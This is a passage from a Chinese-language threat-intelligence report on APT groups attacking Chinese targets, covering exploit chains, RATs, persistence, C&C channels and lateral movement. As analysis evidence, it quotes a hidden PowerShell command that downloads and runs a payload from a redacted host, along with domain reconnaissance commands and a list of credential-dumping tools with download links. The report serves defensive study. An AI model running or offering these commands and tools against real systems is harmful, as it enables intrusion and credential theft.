网络安全行业等\n\n**APT-C-00** 国内某办公软件 政府机构、事业单位等\n\n**APT-C-00** 即时通、证书驱动 政府机构等\n\n**APT-C-01** 微软更新程序 一般用户\n\n**APT-C-06** Microsoft Visio Professional 2013 非特定行业办公人员等\n\n表 6 捆绑合法应用程序的部分列表\n\n## 三、 APT 攻击中的突防利用——漏洞\n\n漏洞种类很多，产生漏洞的环节也多。除了针对系统应用程序的漏洞，人员管理也存在\n漏洞隐患等。攻击者使用漏洞的主要目的是可以在目标系统进行未授权操作，如：读写用户\n敏感数据、安装恶意程序等。\n\nAPT 攻击中利用漏洞主要目的是能达到未授权安装执行，即本章节主要关注远程代码执\n行漏洞，如攻击者利用 CVE-2012-0158 漏洞构造一个 RTF 文件格式以“.doc”扩展名的漏洞\n文档，目标用户当执行该漏洞文档后则有可能被植入 PE 恶意程序。另外比如我们在“网络\n劫持：利用硬件设备”章节提到的正常应用进行常态更新时不进行签名或文件校验这种问题，\n我们在本章节不会展开介绍。\n\n另外利用漏洞的目的就是躲避杀毒软件检测，如 APT-C-00 组织中利用国内某视频应用\n0day 漏洞，利用该溢出漏洞，恶意代码能直接在白进程中执行，所以杀毒软件不会拦截。\n\n14\n\n|APT 组织名称|被捆绑的合法应用程序|涉及人群|\n|---|---|---|\n|APT-C-00|Acunetix Web Vulnerability Scanner（WVS）7|网络安全行业等|\n|APT-C-00|国内某办公软件|政府机构、事业单位等|\n|APT-C-00|即时通、证书驱动|政府机构等|\n|APT-C-01|微软更新程序|一般用户|\n|APT-C-06|Microsoft Visio Professional 2013|非特定行业办公人员等|\n\n\n-----\n\n图 16 APT 组织漏洞利用情况统计\n\n（一） APT 组织具备持有0day 漏洞的能力\n\n版本 时间 厂商 描述 漏洞编号\n\n版本 **A** 2014 年 10 月 14 日 iSIGHT UNC 下载 PE 木马，利用 CVE-2014-4114\n（微软公告发布时间） inf 安装启动 PE 木马\n\n版本 **B** 2014 年 10 月 16 日 Xecure lab[8] 利用 inf 执行嵌入“.ppsx” CVE-2014-4114\n\n（捕获样本时间） 文档内的 PE 木马\n\n版本 **C** 2014 年 9 月 12 日 360 没有利用 inf，直接执行 CVE-2014-6352\n（捕获样本时间） 嵌入“.ppsx”文档内的\n\nPE 木马\n\n表 7 CVE-2014-6352 0day 漏洞（APT-C-05 组织）\n\nCVE-2014-4114 漏洞是 iSIGHT 公司[9]在 2014 年 10 月 14 日发布相关报告，报告其中提到\n一个 0day 漏洞（CVE-2014-4114）用于俄罗斯相关主要针对北约、欧盟、电信和能源相关领\n域的网络间谍活动。微软也是在 10 月 14 日发布相关安全公告。\n\n而 CVE-2014-6352 是可以认为绕过 CVE-2014-4114 补丁的漏洞，微软之前的修补方案首\n先在生成 Inf 和 exe 文件后添加 MakeFileUnsafe 调用，来设置文件 Zone 信息，这样随后在漏\n洞执行 inf 安装时，会有一个安全提示。而 CVE-2014-6352 漏洞样本抛弃了使用 inf 来安装\nexe，转而直接执行 exe。因为 Windows XP 以上系统可执行文件的右键菜单第二项是以管理\n员权限执行，这样导致如果用户关闭了 uac 会导致没有任何安全提醒。所以微软\nCVE-2014-6352 的补丁是在调用右键菜单添加一个安全提示弹窗。\n\n（二） APT 组织更倾向使用1day 和Nday\n\n攻击组织一般都掌握着或多或少的 0day 漏洞，不过考虑到成本问题，他们更倾向使用\n1day 和 Nday 漏洞展开攻击。\n\n8http://blog.xecure-lab.com/2014/10/cve-2014-4114-pptx-apt-xecure-lab.html\n9“iSIGHT discovers zero-day vulnerability CVE-2014-4114 used in Russian cyber-espionage campaign”，\nhttp://www.isightpartners.com/2014/10/cve-2014-4114/\n\n15\n\n|版本|时间|厂商|描述|漏洞编号|\n|---|---|---|---|---|\n|版本A|2014 年10 月14 日 （微软公告发布时间）|iSIGHT|UNC 下载PE 木马，利用 inf 安装启动PE 木马|CVE-2014-4114|\n|版本B|2014 年10 月16 日 （捕获样本时间）|Xecure lab8|利用inf执行嵌入“.ppsx” 文档内的PE 木马|CVE-2014-4114|\n|版本C|2014 年9 月12 日 （捕获样本时间）|360|没有利用 inf，直接执行 嵌入“.ppsx”文档内的 PE 木马|CVE-2014-6352|\n\n\n-----\n\n1） CVE-2015-0097\n\n### WORD HTA VBS EXE 博客 RAT\n\n图 17 CVE-2015-0097 漏洞执行流程（APT-C-05 组织）\n\nCVE-2015-0097 微软在 2015 年 3 月发布补丁，在 2015 年 7 月下旬互联网公开第一个 POC[10]，\n我们在 8 月初捕获到 APT-C-05 组织开始使用该漏洞。漏洞本身是微软 Office 的一个逻辑漏\n洞，不需要传统的漏洞利用流程（如堆喷，构建 ROP 链）。\n\n一个微软 Office 文件如果包含有效的 html 代码，微软 Office 会调用\nMSScriptControl.ScriptControl.1 控件在本地域去打开 html，导致 html 中的脚本也是在本地域\n执行，这样就可以读写本地文件，脚本利用 ADODB.Recordset 在本机启动目录写入了一个\nHTA 文件。导致机器在下次重启时将执行 HTA 中代码，HTA 脚本功能负责下载恶意程序到本\n机执行。\n\n另外比较典型的案例就是，2013 年 CVE-2013-3906 0day 攻击[11]出现不久，APT-C-05 组织\n在 2013 年 11 月中旬也开始使用该漏洞，但使用频率较低。\n\n2） CVE-2012-0158\n\nCVE-2012-0158 是被 APT 组织利用次数最多的一个漏洞，在本报告所分析的 APT 组织中，\nAPT-C-00、APT-C-05、APT-C-12 组织均使用过该漏洞。实际上，在目前我们对境外 APT 的监\n测中发现，还有很多其他的 APT 组织也曾经利用过该漏洞。\n\nCVE-2012-0158 是一个影响多个微软 Office 版本的安全漏洞，利用这个漏洞，远程攻击\n者可以通过诱使用户打开一个经过特殊构造的.rtf 文件，在用户系统上执行任意指令，由于\n漏洞本身的特性利用非常稳定，被广泛用于执行基于邮件附件的针对性攻击。此漏洞被公布\n于 2012 年 4 月，称为“Microsoft Visual Basic Windows Common Controls (MSCOMCTL.OCX)远\n程代码执行漏洞”。显然，该漏洞是一个发动鱼叉邮件攻击的有利武器。攻击者可以将恶意\n构造的 Word 后缀的 RTF 文件作为电子邮件的附件发送给攻击目标，一旦被攻击者的电脑系\n统存在这个漏洞，并且打开了附件，那么恶意代码就可以被释放并执行，而且很难被发现。\n\n10https://packetstormsecurity.com/files/cve/CVE-2015-0097\n11“Microsoft Office Zeroday used to attack Pakistani targets”，\nhttps://www.alienvault.com/open-threat-exchange/blog/microsoft-office-zeroday-used-to-attack-pakistani-target\ns\n\n16\n\n\n-----\n\n# 第四章 攻击手法的不断演进与蜕变\n\n本章就针对中国攻击的 APT 组织，我们从武器构建到横向移动，对 APT 生命周期的每\n个环节进行剖析，详细介绍攻击手法不断演进的过程。\n\n## 一、 侦查跟踪：从目标本身到供应链的延伸\n\n在攻击目标的选择上，不同组织和不同攻击行动所关注的目标是具备一定共性，但也存\n在一定差异性，比如我们发现针对中国的 APT 攻击中，几乎所有的攻击行动都会针对政府、\n科研机构，但到针对具体某单位或个人则有较大差异。\n\n1） 对目标从了解到掌握\n\n发动一起攻击行动，大部分时间会消耗在侦查跟踪（即情报收集环节），为了能达到攻\n击目的，攻击者必须尽可能全面的收集到目标的相关情报信息，从而逐步对目标从了解到掌\n握。\n\n公开资源：关注涉及目标领域或行业的相关人群，APT 组织主要通过一些公开资源（行\n业网站、学术期刊，其中重点是关注行业峰会、论坛等）收集相关具体到单位或个人的信息，\n\n窃取的情报：另外攻击者通过以往自主或第三方 APT 组织窃取的情报数据中，进行分\n析筛选或提炼出目标具体信息。在 APT-C-12 组织中大量目标疑似是通过这种方式获得，而\n且获取的情报数据还会作为诱饵文档进行后续攻击使用。\n\n组织之间合作：另外在“造成的危害”章节我们提到有几个用户不仅受 APT-C-01 组织\n相关攻击行动影响，同样也是 APT-C-12 组织的目标，我们怀疑不同组织或许有共同的目标。\n由此现象和结合其他深入分析，我们怀疑在 APT-C-01 组织和 APT-C-12 组织之间或许有情报\n资源共享等协作的情况。\n\n最后 APT 组织会从未知渠道（泄漏库、传统地下产业链等）得到目标相关信息。\n\n另外在 APT 攻击生命周期中，每个环节对目标的认识都是不一样的，在初始攻击成功\n后展开横向移动，即需要对新的目标的研究分析，在掌握足够多的情报信息后才能判断是否\n展开攻击，以及如何发动攻击。\n\n2） 针对供应链的攻击\n\n在侦查跟踪过程中，攻击者会对目标的防御措施有一个初步的评估，该评估结果决定了\n初始攻击中该采用何种攻击方法。如果目标本身的防御措施较为完备或者在对目标直接的初\n始攻击中未达到预期效果，则攻击者会采用间接的攻击方式。\n\n在 APT-C-00 早期攻击行动中，攻击者首先攻击了国内某软件公司，该公司核心产品主\n要的客户是政府机构和企事业单位。攻击者在攻陷了该公司后，对相关产品安装和升级程序\n中植入了后门程序，该公司相关客户通过网站或者其他途径下载相关安装包则会被感染。在\n我们回溯分析后确定攻击者真正目标并非某软件公司，而是国内某政府机构。这也是典型的\n针对目标供应链的攻击，这种攻击方式在其他 APT 攻击中也出现过，比如 2014 年公开 Havex\n木马[12]，也被称作蜻蜓（Dragonfly）和活力熊（Energetic Bear）。相关攻击通过攻击与目标有\n\n12“Havex Hunts For ICS/SCADA Systems”，https://www.f-secure.com/weblog/archives/00002718.html\n\n17\n\n\n-----\n\n密切业务联系的第三方企业或机构，来进行迂回攻击。Havex 木马的相关攻击就是通过攻击\n工业控制系统（Industrial Control Systems）相关供应商的网站，进一步替换相关软件安装包\n来进行 Havex 木马的传播。\n\n## 二、 武器构建：从公开RAT 到委托定制\n\nRAT（Remote Access Trojan，远程访问木马）的文件格式、文件形态、功能形态、恶意\n代码寄宿位置等变化都是比较大的。\n\n其中，文件格式整体趋势是从 PE 到非 PE 转变，文件形态也由实体文件逐步转化为无实\n体文件。单以常见的 PE 格式而言，RAT 的开发者逐渐将兴趣转移至非 VC 编译环境，开始越\n来越多的使用 Delphi、GCC、NSIS、AutoIt 等小众编译器或脚本解释器，从而进一步提升检\n测和对抗成本。\n\n从功能形态而言，从早期的单个文件聚合多种功能逐渐演变为功能单一的主、子模块间\n互相调用的模式，甚至开始引入“云控”的概念，针对目标环境差异，有针对性的下发特定\n功能模块达成不同的目的。\n\n而恶意代码最终寄宿的位置也从常见的系统目录逐渐进入到更加难以追踪的 MBR、VBR、\n磁盘固件、EFI、BIOS 乃至于移动存储设备中的隐藏分区中。以方程式 RAT 为例，RAT 开发\n者使用窃取来的磁盘固件格式文档，将恶意代码写入到磁盘固件中，导致除了磁盘生产商外，\n没有任何安全厂商可以实现检测及恶意代码提取。\n\n1） 利用公开 RAT 呈现下降趋势\n\n目前使用公开的 RAT 呈现下降趋势，公开的 RAT 主要以 Poison Ivy、ZxShell 和 Gh0st 为\n主，但基于公开的 RAT，基本都会进行修改添加一些其他辅助功能（如窃取 Outlook、指定\n文档扩展名等）。\n\n2） 更倾向自主开发或委托定制\n\n2015 年主流是未知 RAT，其中有明显组织自行开发的，如 APT-C-05 相关母体结构和加\n密算法的相似性，其主要功能是窃取指定扩展名文档并加密分片回传。另外就是商业化的问\n题，如依托 Cobalt Strike 平台生成的恶意代码，另外 APT-C-00 组织使用的 RAT 类型众多，而\n且是非公开类型，怀疑不是自行开发，或许是向第三方委托定制开发。\n\n除了已知商业和公开源码的后门程序以外，在 APT-C-00、APT-C-06、APT-C-12 等组织，\n针对 win32 平台的未知 RAT 还有 Fake Tools、Plutonium、NL2、Encryptor、Cloudrunner 等。\n这些 RAT 之间差异都较大，单从代码结构我们很难将这些归属为同一组织所使用，其中这些\n类型大部分都是在同一时期内投入使用，也就是有可能相关 APT 组织在开发这些后门程序\n有多个团队或个人独立开发维护，另外就是从互联网地下产业链购买第三方的，或委托第三\n方定制开发的。\n\n## 三、 载荷投递：低成本和周期性\n\n1） 周期性精确打击\n\n在常态攻击中 APT 组织更倾向在工作日（即星期一至星期五）发动攻击，其中水坑攻\n击更倾向在星期一和星期二发动攻击。另外部分集中攻击会选择在一些特殊的时间节点，如\n\n18\n\n\n-----\n\n某行业会议召开之际，或某单位发布紧急通知等，另外就是一些中国的大型节日，如国庆、\n春节等展开攻击。\n\n以 APT-C-00 为例，由于中国政府和研究机构的工作人员往往有在星期一、二登录办公\n系统查询重大内部新闻和通知的习惯，所以在一周的前两天发动水坑攻击，效果相对更好。\n另外 APT-C-00 组织发动水坑攻击持续周期比较短，一般为 3-5 天，而且在这期间也不是一\n直将恶意代码放置在被攻陷网站上，在一天内也有选择时间段进行攻击。在完成攻击后，\nAPT-C-00 组织会将篡改的内容删除或恢复。\n\n图 18 水坑攻击一周分布（APT-C-00 组织）\n\n鱼叉邮件在一周 7 天中，工作日，即星期一至星期五截获的鱼叉攻击数量较多，而周末\n截获的鱼叉攻击数量则往往不及工作日的 1/5，相关具体攻击时间是符合中国东八区时区。\n\n图 19 鱼叉攻击一周分布（APT-C-00 组织）\n\n2） 低成本的载荷投递\n\n在大部分的 APT 攻击中载荷投递部分，都涉及到了鱼叉邮件与水坑网站两种形式，针\n对中国境内的定向攻击，这两种方式的成本非常低，在第四章已经做了详尽的描述，这里不\n再赘述。\n\n19\n\n\n-----\n\n不过值得关注的是，载荷投递也存在其他类似于网络劫持甚至物理接触等方式，由于成\n本较高，所以在我们所发现的 APT 攻击中，数量较少，不过一旦发生，其背后所隐匿攻击\n组织的整体能力也相对较强。\n\n## 四、 突防利用：从Windows 到多种操作系统\n\n1） 针对 Mac OS X 操作系统\n\nAPT 组织较早就开始关注 Mac OS X 操作系统，比如早期的 Luckycat13、Icefog14等 APT\n组织都有针对 Mac OS X 的攻击。在 APT-C-00 组织浮出水面之前，我们尚未发现有针对 Mac\nOS X 的 APT 攻击。\n\n我们将 APT-C-00 这类针对 Mac OS X 的木马命名为 OceanLotus MAC 木马。下表是 MAC\n木马是基本功能：\n\n功能 命令\n\n列目录 ls [path]\n\n进入目录 cd [path]\n\n获取当前目录 pwd\n\n删除文件 rm<file_path>\n\n复制文件 cp<srcppath><dstpath>\n\n移动文件 mv <srcpath><dstpath>\n\n获取进程信息 p {info:pid | ppid | name}\n\n杀掉进程 kill <pid>\n\n执行命令 cmd<command system>\n\n抓取通信 capture <saved_path>\n\n显示文件 cat path [num_byte]\n\n下载文件 download fromURLsavePath\n\n表 8 MAC 木马功能列表（APT-C-00 组织）\n\n另外 MAC 木马也具有较强对抗能力，具体包括以下几个方面：\n\na） 对其自身做了非常强的加密，分析时需要进行手工解密。\n\nb） 木马会修改苹果浏览器的安全属性，使下载的程序直接运行而没有安全风险提示。\n\nc） 木马会定时使用/bin/launchctl 上传操作。\n\nd） 木马会读取操作系统的版本。\n\ne） 木马会检测 Parallels 虚拟机。\n\n13“Adding Android and Mac OS X Malware to the APT Toolbox”。\nhttp://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_adding-android-andmac-osx-malware-to-the-apt-toolbox.pdf\n14“THE ‘ICEFOG’ APT: A TALE OF CLOAK AND THREE DAGGERS”，\nhttp://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/icefog.pdf\n\n20\n\n|功能|命令|\n|---|---|\n|列目录|ls [path]|\n|进入目录|cd [path]|\n|获取当前目录|pwd|\n|删除文件|rm<file_path>|\n|复制文件|cp<srcppath><dstpath>|\n|移动文件|mv <srcpath><dstpath>|\n|获取进程信息|p {info:pid | ppid | name}|\n|杀掉进程|kill <pid>|\n|执行命令|cmd<command system>|\n|抓取通信|capture <saved_path>|\n|显示文件|cat path [num_byte]|\n|下载文件|download fromURLsavePath|\n\n\n-----\n\n2） 针对 Android 操作系统\n\n在 APT 攻击中，除了针对传统 PC 平台，针对移动平台的攻击也越来越多。如智能手机\n等移动通信设备，天生有传统 PC 不具备的资源，如通话记录、短信信息、地理位置信息等。\n\n将恶意 APK 木马植入 Android 系统的方式有很多，其中比较典型就是通过 PC 感染 Android\n手机，我们捕获到的一起 APT 攻击中，攻击者在攻陷了 PC 机器后，进一步会收集感染机 adb\n信息，并利用 QQ 等软件的 adb 工具将名为 androidservice.apk 的 Android 木马文件安装到被\n感染机器连接的手机终端中。\n\n窃取的信息主要包括：录音、拍照、电话录音、录像、通话记录、通讯录、短信、SD\n卡中文件、手机基本信息、地理位置信息，进一步手机基本信息包括如 imsi，imei，电话号\n码，可用内存，屏幕长宽，网卡 mac 地址，SD 卡容量等信息。\n\n另外在 2015 年的 Hacking Team[15]“军火库”泄漏事件中，我们也看到针对中国的一些\n网络攻击，其中就利用 Android 漏洞进行的相关攻击。\n\n## 五、 安装植入：无自启动，如何持久？\n\n在持续化攻击对抗中，APT 组织比较难解决的问题之一是开机启动。因为一旦木马通过\n修改注册表、服务、计划任务等方式实现自启动，往往也触发杀毒软件的主动防御功能，会\n给用户以警觉，并且木马会很容易进入杀毒软件的视野。\n\n1） 修改快捷方式\n\n在 APT-C-12 中，释放的 RAT 首先会修改开始菜单的程序里面的所有快捷方式，指向\nrundll32，加载起来后门 dll，同时实现快捷方式的正常功能，所以很难发现异常。\n\n图 20 实现相关功能的恶意批处理脚本部分截图（APT-C-12 组织）\n\n2） 利用 DLL 劫持\n\n在 Windows 操作系统中，可执行文件 EXE 在执行过程中，往往需要加载动态链接库 DLL，\n加载优先顺序是：当前目录、系统目录、环境变量。在 WindowsXP 操作系统中，并没有对\n系统 DLL 加以特殊限制，使得木马可以在当前可执行 EXE 目录中伪装系统 DLL，在可执行文\n件 EXE 执行过程中，正因加载顺序机制，会优先加载当前目录下同名伪装的 DLL。（在\nWindows7 等后期操作系统中，加载系统 DLL 时默认从系统目录加载，默认情况下无法使用\n该漏洞）\n\n在 APT-C-01 攻击中，攻击者先伪造一个系统同名的 DLL，提供同样的输出表，每个输出\n函数转向真正的系统 DLL。程序调用系统 DLL 时会先调用当前目录下伪造的 DLL，完成相关\n\n15Hacking Team“军火库”泄漏企业需高度警惕漏洞攻击，http://bobao.360.cn/news/detail/1740.html\n\n21\n\n\n-----\n\n功能后，再跳到系统 DLL 同名函数里执行。木马作者将用于劫持的 DLL 释放到事先预知的开\n机会启动的第三方程序目录中，实现开机启动木马的目的。\n\n应用名称 具体路径\n\n搜狗输入法 C:\\program files\\sogouinput\\components\\xxx.dll\n\n阿里旺旺 C:\\program files\\aliwangwang\\8.00.34c\\xxx.dll\n\n表 9 第三方程序目录示例（APT-C-01 组织）\n\n当用户下次开机或重启时进入系统时，第三方软件会自动启动，但是由于 DLL 劫持漏洞\n的存在，也就自动加载了木马。操作系统在执行 EXE 之前，先会初始化 DLL 环境，DLLMain\n函数会在 EXE 程序 Main 函数执行之前优先被执行。木马作者正是利用了这点，把恶意代码\n编写到 DLLMain 中，这样做就能在很大概率上保证木马比杀毒软件的 EXE 进程优先执行。而\n在开机启动的瞬间，杀毒软件有可能还没有完成初始化过程，主动防御和自我保护功能往往\n还没有生效。木马正是利用这短暂的时机，释放并启动下一步所需要的另一个驱动级木马。\n\n3） 无自启动\n\n卡巴斯基发布的 Duqu2.0 报告中，我们可以看到 Duqu2.0 只存活在内存当中，为了达到\n其持久性攻击者选择长时间运行的服务器。从 Duqu2.0 这个实例，我们不仅仅看到了从单一\n机器突破到感染整个网络的过程，另外也体会到攻击者的自信。\n\n我们发现的如 APT-C-00、APT-C-05、APT-C-12 等 APT 组织中，所使用的部分 RAT 也是没\n有自启动功能的，这些 RAT 并非单一的功能模块，而是完整独立的后门程序。没有自启动，\n被感染机器在重启之后，恶意代码则无法在自动执行，那是这些 APT 组织如同 Duqu2.0 放\n弃了持久性？还是另有其他途径可以重新感染？目前我们推测大概有以下几种可能性：\n\na）人工职守：也就是一旦初始攻击成功之后，攻击者会第一时间判断目标的价值，是\n否需要保留进行下一步横向移动，还是放弃。也就是当人工介入该环节，则可以下发另一种\n完全不同具备持久化的 RAT。我们更倾向于这种推测。\n\nb）依赖原始母体文件：RAT 的释放和植入一般由另一个 PE 恶意程序或利用漏洞，其中\nPE 恶意程序一般伪装为文档形态。从我们监控的情况来看，部分母体程序在释放了 RAT 后，\n本身并无变化，如果被感染用户没有察觉，则还会将该母体认为是正常的文档。也就是攻击\n者需等待被感染用户再次执行母体程序，才能造成二次感染。但我们认为攻击者以这种初衷\n的可能比较少。\n\nc）其他方法再次感染：或者借助一些其他方法进行感染，且攻击者有信心保证能成功\n再次感染。相关方法如利用 0day 漏洞、获得篡改网络流量权限等。\n\n## 六、 通信控制：依托第三方平台隐藏\n\n通信控制（C&C，Command and Control），也就是攻击者与 RAT 之间的通信。几乎所有\n的 APT 攻击行动都会有此环节，一般目的是更新恶意代码本身或配置文件；接受相关控制\n指令；以及回传窃取的数据信息等。\n\n1） 倾向动态域名\n\nAPT 组织在选择 C&C 域名的时候，更倾向采用动态域名，且从我们捕获到针对国内的\n\n22\n\n|应用名称|具体路径|\n|---|---|\n|搜狗输入法|C:\\program files\\sogouinput\\components\\xxx.dll|\n|阿里旺旺|C:\\program files\\aliwangwang\\8.00.34c\\xxx.dll|\n\n\n-----\n\nAPT 攻击行动来看，均采用境外动态域名服务商，其中主要的服务商有：ChangeIP、DynDNS、\nNo-IP、Afraid（FreeDNS）、dnsExit 等\n\n图 21 APT 组织 C&C 服务器域名使用情况\n\n对于攻击者而言采用动态域名的主要好处是，相关注册信息不对外公开（即无 whois\n信息），安全研究人员很难关联回溯。如果想知道某个动态域名的具体注册信息，则需要该\n域名持有者权限才可以在相应动态域名服务商进行查询。\n\n2） 利用云盘存储窃取的数据信息\n\n针对国内的 APT 攻击中，APT-C-02 是采用了 Dropbox，APT-C-05 组织是借助国内某网盘\n进行窃取数据的回传。\n\nAPT-C-05 网盘版木马会每隔一小时将窃取的最新数据打包加密后进行回传，C&C 地址是\n网盘地址，通过网盘官方提供的 API 进行文件上传。\n\n3） 利用第三方博客中转\n\n通过博客或社交网络（SNS）进行 C&C 指令下发，在 APT 攻击中不算是一个新手段了，\n但主要出现在境外的一些攻击行动中，主要借助 Facebook、Twitter 等社交网络。\n\n在国内利用社交网络进行 C&C 通信的攻击还是较少。在针对国内的 APT 攻击中，我们\n监控到 APT-C-05 组织在 2015 年 8 月开始依托第三方博客作为中转平台，进行恶意代码传播，\n这里主要是依托国内第三方某知名博客，攻击者首先会注册博客帐号，发表的每篇博客文章\n会包含 shellcode 形态的恶意代码，shellcode 是以博文形式存放。\n\n另外在 10 月左右我们发现 APT-C-05 组织已经放弃使用这种方法，转而使用攻击者自己\n所属的服务器进行恶意代码的中转传输。\n\n## 七、 达成目标：横向移动以扩大战果\n\n我们在 APT-C-00 组织和 APT-C-12 组织中都发现了横向移动相关迹象，攻击者会从受感\n染机器中选择部分机器进行横向移动，一个典型案例就是 APT-C-12 组织中一台被感染机器\n被先后植入了数十种不同功能，用于横向移动的脚本程序或可执行程序\n\n23\n\n\n-----\n\n一般首先是侦察和识别网络拓扑，获取域计算机信息，获取当前计算机相关主机信息，\n另外包括网卡信息、路由信息等；查看远程计算机服务及状态。获取指定 IP 的共享信息，\n获取共享目录。扫描内网机器远程端口。\n\n另外是进一步的窃取数据资料，主要补充 RAT 原本没有的功能，相关数据主要偏向文档\n数据、帐号密码和本机环境信息。比如 APT-C-12 组织目的是窃取用户 Outlook 密码、桌面截\n图等，另外获取本地安装软件信息、磁盘信息等，而 APT-C-00 组织主要是窃取指定敏感文\n档数据。\n\n1） “就地取材”：利用系统本身功能\n\nAPT 组织采用“就地取材”的方式利用 Windows 系统自带命令对受感染目标机器的内\n部网络环境进行侦查，下表是 APT-C-12 组织在实际攻击中使用的部分命令，相关命令多以\nVBS 和 BAT 脚本交替执行。\n\n命令 解释\n\n**net view** 显示域、计算机或由指定计算机共享资源的列表。\n\n**ipconfig /all** Windows IP 配置,ipconfig /all 显示详细信息\n\n**netstat–an** 显示协议统计和当前 TCP/IP 网络连接。-a 显示所有连接和侦听端\n口。-n 以数字形式显示地址和端口号。\n\n**nbtstat -A** 列出指定 IP 地址的远程机器的名称表。\n\n**systeminfo** 显示系统信息\n\n**tracert -w 1000 8.8.8.8** 设置超时时间 1 秒,查看当前网络到 8.8.8.8 的链路信息\n\n**ping** Ping 指定的主机\n\n**telnet** 连接指定主机的指定端口\n\n表 10 相关命令列表（APT-C-12 组织）\n\n下表是 APT-C-00 组织在实际攻击中使用的部分命令。\n\n相关步骤 具体命令\n\n步骤 **1** %userprofile%\\appdata\\roaming\\tencent\\qq\\qq.exe\n\ncmd.exe /c powershell.exe -nop -w hidden -c \"IEX ((new-object\nnet.webclient).downloadstring('http://XXXXXX:8080/images/XXXXXX'))\"\n\n步骤 **2** C:\\Windows\\SysWOW64\\cmd.exe /C ipconfig /all\nC:\\Windows\\SysWOW64\\cmd.exe /C nbtstat -a 10.3.XX.XXX\nC:\\Windows\\SysWOW64\\cmd.exe /C net start\nC:\\Windows\\SysWOW64\\cmd.exe /C netstat -an\nC:\\Windows\\SysWOW64\\cmd.exe /C net group \"domain admins\" /domain\n\n表 11 相关命令列表（APT-C-00 组织）\n\n步骤 1：参数“-nop”不加载默认的 PowerShell 配置文件，“-w hidden”没有窗口，“-c”\n执行命令从 URL：'http://XXXXXX:8080/images/XXXXXX'，下载并且隐藏执行。\n\n另外值得注意的是下载的文件就是 APT-C-00 组织的 Encryptor 木马衍生 PowerShell 脚本，\n这个 PowerShell 脚本通过我们分析得出该脚本是由 Cobalt Strike[16]自动化测试攻击平台生成\n的。攻击者只需通过 Cobalt Strike 平台简单配置 C&C 地址即可生成。该 PowerShell 脚本后续\n\n16Cobalt Strike 官方网站，https://www.cobaltstrike.com/\n\n24\n\n|命令|解释|\n|---|---|\n|net view|显示域、计算机或由指定计算机共享资源的列表。|\n|ipconfig /all|Windows IP 配置,ipconfig /all 显示详细信息|\n|netstat–an|显示协议统计和当前 TCP/IP 网络连接。-a 显示所有连接和侦听端 口。-n 以数字形式显示地址和端口号。|\n|nbtstat -A|列出指定 IP 地址的远程机器的名称表。|\n|systeminfo|显示系统信息|\n|tracert -w 1000 8.8.8.8|设置超时时间1 秒,查看当前网络到8.8.8.8 的链路信息|\n|ping|Ping 指定的主机|\n|telnet|连接指定主机的指定端口|\n\n|相关步骤|具体命令|\n|---|---|\n|步骤1|%userprofile%\\appdata\\roaming\\tencent\\qq\\qq.exe cmd.exe /c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://XXXXXX:8080/images/XXXXXX'))\"|\n|步骤2|C:\\Windows\\SysWOW64\\cmd.exe /C ipconfig /all C:\\Windows\\SysWOW64\\cmd.exe /C nbtstat -a 10.3.XX.XXX C:\\Windows\\SysWOW64\\cmd.exe /C net start C:\\Windows\\SysWOW64\\cmd.exe /C netstat -an C:\\Windows\\SysWOW64\\cmd.exe /C net group \"domain admins\" /domain|\n\n\n-----\n\n会释放出 Beacon RAT。\n\n步骤 2：查看网络信息、查看内网主机 10.3.XX.XXX 的 NetBIOS 名称、查看当前主机启动\n的服务、查看网络连接状况、查看域中的管理员帐户列表、查看本机的用户帐户。\n\n2） 第三方工具\n\n在该环节，APT 组织除了采用目标系统自带命令以外，更倾向与借助大量第三方工具来\n进行拓展攻击。第三方工具的优势在于相关功能不仅可以满足攻击需求，而且由于相关工具\n本身作为正常用途，所以不会被安全软件所检测。以下是我们发现的 APT 攻击中常用的第\n三方工具。\n\n相关工具 功能 相关公开下载地址\n\n**nbtscan** 扫描 NetBIOS 相关信息 http://www.unixwiz.net/tools/nbtscan-1\n\n.0.35.exe\n\n**OutlookPasswordDump** 获取 Outlook 用户密码 http://securityxploded.com/outlook-pas\n\nsword-dump.php\n\n**Pwdump7** 获取系统用户密码 http://www.tarasco.org/security/pwdum\np_7/\n\n**Mimikatz** 获取系统用户密码 https://github.com/gentilkiwi/mimikatz\n\n表 12 部分第三方工具列表（APT-C-00\\APT-C-12 等组织）\n\n25\n\n|相关工具|功能|相关公开下载地址|\n|---|---|---|\n|nbtscan|扫描NetBIOS 相关信息|http://www.unixwiz.net/tools/nbtscan-1 .0.35.exe|\n|OutlookPasswordDump|获取Outlook 用户密码|http://securityxploded.com/outlook-pas sword-dump.php|\n|Pwdump7|获取系统用户密码|http://www.tarasco.org/security/pwdum p_7/|\n|Mimikatz|获取系统用户密码|https://github.com/gentilkiwi/mimikatz|\n\n\n-----\n\n# 第五章 APT 攻击为中国本土量身定制\n\n## 一、 熟悉目标所属行业领域\n\n1） 诱饵信息内容\n\n精心构造邮件和诱饵文档内容，尤其诱饵文档疑似二次利用（一些未公开文档资料作为\n诱饵）。内容绝大多数为中文简体，如果涉及具体单位会发送英文信息。\n\n另外部分诱饵信息时效性极强，如某行业技术有重大突破，在消息刚在业内公开，相关\n诱饵信息则就已构造完成。为了规避对术语或行业用语的不熟悉或暴露攻击者相关信息，某\n些诱饵信息直接从国内主流新闻网站复制相关新闻报告内容放到诱饵文档中。\n\n另外从诱饵信息来判断，攻击者不仅关注目标所属行业，也会关注目标爱好、生活等等。\n我们对部分特殊诱饵文件的文件名进行了相关调查分析，均为真实存在的内容，绝非杜撰。\n\n\n相关文件名\n\n\n关于国家***研究中心工程建设的函.exe\n\n\n国家**局的紧急通报.exe\n\n\n最新新疆暴动照片与信息.jpg.exe\n\n\n本周工作小结及下周工作计划.exe\n\n\n***厅关于印发《2014 年***应急管理工作要点》的通知.exe\n\n\n2015 年 1 月 12 日下发的紧急通知.exe\n\n\n商量好的合同.exe\n\n\n***部关于开展 2015 年***调查工作的通知.exe\n\n\n表 13 部分诱饵文档文件名列表\n2） 窃取敏感数据\n\n窃取的敏感数据中主要以文档为主，APT 组织更关注 WPS Office 相关文档，其中 APT-C-05\n和 APT-C-12 组织都会关注以“.wps”扩展名的文档，进一步 APT-C-12 还会关注扩展名为“.et”、\n“.dps”的另外两种 WPS Office 文档，这两种文档相当于微软 Office 的 Excel 表格文档和\nPowerPoint 幻灯片文档，WPS Office 